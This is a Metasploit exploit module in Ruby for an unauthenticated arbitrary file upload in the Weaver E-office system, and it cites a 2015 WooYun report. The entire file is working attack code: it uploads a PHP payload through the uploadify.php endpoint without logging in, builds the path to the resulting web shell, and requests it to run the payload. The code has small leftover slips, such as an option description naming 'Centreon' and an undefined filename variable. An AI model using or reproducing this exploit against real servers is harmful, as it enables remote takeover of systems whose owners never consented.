require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => '泛微Eoffice 系统任意文件上传getshell',
                      'Description' => %q{
                            general/weibo/javascript/uploadify/uploadify.php 无需登录等认证即可上传任意文件
                                 },
                      'Author' =>
                          [
                              'tyomcat',
                          ],
                      'License' => MSF_LICENSE,
                      'References' =>
                          [
                              ['url', 'http://wooyun.org/bugs/wooyun-2015-0125592'],
                          ],
                      'Privileged' => true,
                      'Platform' => ['php'],
                      'Targets' => [['all of them', {}],],
                      'Arch' => ARCH_PHP,
                      'DefaultTarget' => 0,
          ))
    register_options(
        [
            Opt::RHOST(),
            Opt::RPORT(80),
            OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/']),
        ], self.class)
  end

  def upload
    @userid = "#{rand_text_alphanumeric(rand(10)+6)}"
    php = "<?php #{payload.encoded}?>"

    data = Rex::MIME::Message.new
    data.add_part(php, 'application/x-php', nil, "form-data; name=\"Filedata\"; filename=\"test.php\"")
    post_data = data.to_s

    print_status("Uploading #{@fname} payload...")
    res = send_request_cgi({
                               'method' => 'POST',
                               'uri' => normalize_uri(target_uri.path, 'general', 'weibo', 'javascript', 'uploadify', "uploadify.php?userID=#{@userid}"),
                               'ctype' => "multipart/form-data; boundary=#{data.bound}",
                               'data' => post_data,
                           })
    if res.code.to_s == '200'
      shellpath = normalize_uri(target_uri.path, 'attachment', 'personal', @userid, "#{@userid}_temp.php")
      print_good("Shell address：#{shellpath}")
      print_status("Executing the payload...")
      send_request_cgi(
          {
              'uri' => shellpath,
              'method' => 'GET'
          }, 5)
      print_good("Executed payload")
    else
      fail_with(Failure::Unknown, "#{rhost} cant get crumb value ")
    end
  end

  def exploit
    upload
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def targeturi
    datastore['TARGETURI']
  end

end
